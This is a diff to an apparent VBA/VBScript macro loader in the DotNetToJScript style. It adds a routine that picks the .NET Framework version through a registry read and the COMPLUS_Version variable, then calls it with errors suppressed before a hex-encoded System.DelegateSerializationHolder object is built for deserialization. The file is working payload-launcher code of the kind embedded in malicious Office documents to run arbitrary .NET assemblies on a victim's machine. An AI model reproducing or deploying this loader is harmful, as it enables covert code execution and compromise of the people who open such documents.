@@ -24,6 +24,19 @@
 ' Copy code.txt into the section specified below.
 
 
+Sub SetVersion
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+Dim ver
+ver = "v4.0.30319"
+On Error Resume Next
+shell.RegRead "HKLM\SOFTWARE\\Microsoft\.NETFramework\v4.0.30319\"
+If Err.Number <> 0 Then
+  ver = "v2.0.50727"
+  Err.Clear
+End If
+shell.Environment("Process").Item("COMPLUS_Version") = ver
+End Sub
 
 Public binary As String
 Public code As String
@@ -53,6 +66,11 @@ Private Function decodeHex(hex)
 End Function
 
 Function Run()
+
+    On Error Resume Next
+    
+    SetVersion
+
     Dim serialized_obj
         serialized_obj = "0001000000FFFFFFFF010000000000000004010000002253797374656D2E44656C656761746553657269616C697A6174696F"
     serialized_obj = serialized_obj & "6E486F6C646572030000000844656C65676174650774617267657430076D6574686F64300303033053797374656D2E44656C"
